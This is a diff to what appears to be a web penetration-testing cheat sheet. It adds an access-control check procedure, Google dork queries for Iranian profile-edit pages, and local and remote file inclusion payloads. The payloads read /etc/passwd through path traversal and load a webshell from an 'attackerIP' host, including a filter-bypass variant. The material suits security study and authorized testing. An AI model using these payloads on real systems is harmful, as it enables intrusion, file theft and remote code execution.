@@ -8,13 +8,13 @@
 - GHDB
   - site:ir inurl:editform.aspx
   - site:ir inurl:editprofile.php
-- در سایت لاگین کرده و تمامی آدرس ها را ذخیره می کنیم، سپس خارج شده و دوباره دسترسی تمام صفحات را بررسی م یکنیم 
+- Login => Visit & save all pages => Logout => Check access to all pages
 
 
 ## File Access Attach
-
-
-## Get Image Size
-
-
-## Find Uploaded Shell
+- LFI
+  - ```index.php?page=../../../../../../../../../../etc/passwd``` 
+  - ```index.php?page=../../../../../../../../../../etc/passwd%00```
+- RFI
+  - ```index.php?page=http://attackerIP/webshell.php``` 
+  - ```index.php?page=htthttpp://attackerIP/webshell.php```
